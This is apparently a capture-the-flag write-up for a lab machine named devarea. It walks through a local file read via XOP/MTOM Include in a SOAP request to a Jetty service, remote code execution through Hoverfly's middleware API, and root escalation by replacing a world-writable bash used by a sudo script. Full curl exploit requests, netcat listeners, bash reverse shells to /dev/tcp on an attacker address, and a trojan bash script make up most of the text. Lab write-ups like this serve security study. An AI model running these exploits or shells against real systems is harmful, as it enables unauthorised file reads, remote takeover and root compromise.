LFI via XOP/MTOM SOAP Injection

The Jetty service on port 8080 exposes a JAX-WS SOAP endpoint at /employeeservice. Probing it reveals it accepts MTOM multipart requests for the submitReport operation.

What is XOP/MTOM?

MTOM (Message Transmission Optimization Mechanism) is a W3C standard for embedding binary data in SOAP messages. It uses XOP (XML-binary Optimized Packaging) which allows referencing external data via <xop:Include href="..."/>. The href attribute normally references a MIME part — but it also accepts file:// URIs, causing the server to read local files and return their contents base64-encoded in the response.

The server doesn't validate or restrict the href URI scheme, allowing arbitrary local file reads as the service user.

Exploiting the LFI

We craft a malicious MTOM request targeting /etc/systemd/system/hoverfly.service — if Hoverfly is running as a systemd service, the service file will contain its startup command including any credentials passed as arguments.

$ curl -s -X POST http://10.129.xx.xxx:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root@example.com>"; start-info="text/xml"' \
  --data-binary $'--MIMEBoundary\r\n\
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\n\
Content-Transfer-Encoding: 8bit\r\n\
Content-ID: <root@example.com>\r\n\r\n\
<?xml version="1.0"?>\
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://devarea.htb/">\
<soap:Body><tns:submitReport><arg0><confidential>false</confidential>\
<content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" \
href="file:///etc/systemd/system/hoverfly.service"/></content>\
<department>x</department><employeeName>x</employeeName>\
</arg0></tns:submitReport></soap:Body></soap:Envelope>\r\n--MIMEBoundary--'

The server responds with the file contents base64-encoded inside the <Content> tag of the SOAP response:

<return>Report received from x. Department: x. Content: W1VuaXRdCkRlc2NyaXB0aW9u...</return>

RCE via Hoverfly Middleware

Hoverfly supports a middleware feature — an external binary/script that all proxied HTTP traffic is piped through for modification. This is configured via a PUT request to /api/v2/hoverfly/middleware. As an authenticated admin we can set this to anything we want, giving us direct command execution as the dev_ryan user.

Setting Up the Listener

$ nc -lvnp 4444

Triggering the Reverse Shell

$ curl -s -X PUT http://10.129.xx.xxx:8888/api/v2/hoverfly/middleware \
  -H 'Authorization: Bearer <JWT>' \
  -H 'Content-Type: application/json' \
  -d '{"binary":"/bin/bash","script":"bash -i >& /dev/tcp/10.10.xx.xxx/4444 0>&1 &"}'

Hoverfly executes the script when processing the middleware configuration, immediately triggering a callback to our listener:

Privilege Escalation — World-Writable Bash + sudo

With a shell as dev_ryan we enumerate the system for privesc vectors. Two vulnerabilities combine to give us root.

Vulnerability 1 — /usr/bin/bash is World-Writable

dev_ryan@devarea:/opt/HoverFly$ ls -la /usr/bin/bash
-rwxrwxrwx 1 root root 1446024 Mar 28 23:30 /usr/bin/bash

The system bash binary has 777 permissions — any user can overwrite it. This is a critical misconfiguration.

Vulnerability 2 — sudo syswatch.sh

The dev_ryan user can run /opt/syswatch/syswatch.sh as root via sudo with no password. That script internally calls bash — meaning if we replace /usr/bin/bash, root will execute our evil version when the script runs.

The ETXTBSY error ("text file busy") prevents overwriting a running binary directly. We work around this by writing to /tmp/evil_bash first, then copying it over after killing all bash processes.

Building the Evil Script

We create a replacement bash that fires a root reverse shell, restores the real bash, then continues executing normally so the sudo call doesn't error out:

# Back up real bash
dev_ryan@devarea:~$ cp /bin/bash /tmp/bash.bak

# Write evil script to /tmp using hex encoding to avoid special char issues
dev_ryan@devarea:~$ python3 -c "import binascii; open('/tmp/evil_bash','wb').write(binascii.unhexlify('23212f746d702f626173682e62616b0a...'))"

dev_ryan@devarea:~$ chmod +x /tmp/evil_bash

The evil script content:

#!/tmp/bash.bak
bash -i >& /dev/tcp/10.10.xx.xxx/4445 0>&1 &   # fire root shell
cp /tmp/bash.bak /usr/bin/bash                    # restore real bash
exec /tmp/bash.bak "$@"                           # continue normally

Triggering Root Shell

Start a second listener on port 4445, then trigger the privesc — we need to kill running bash processes to release the file lock, copy the evil script over, then invoke sudo:

dev_ryan@devarea:~$ /bin/dash -c 'killall -9 bash; sleep 2; cp /tmp/evil_bash /usr/bin/bash; sudo /opt/syswatch/syswatch.sh --version' &

When syswatch.sh runs as root and calls bash, our evil script executes — firing a shell back as root:
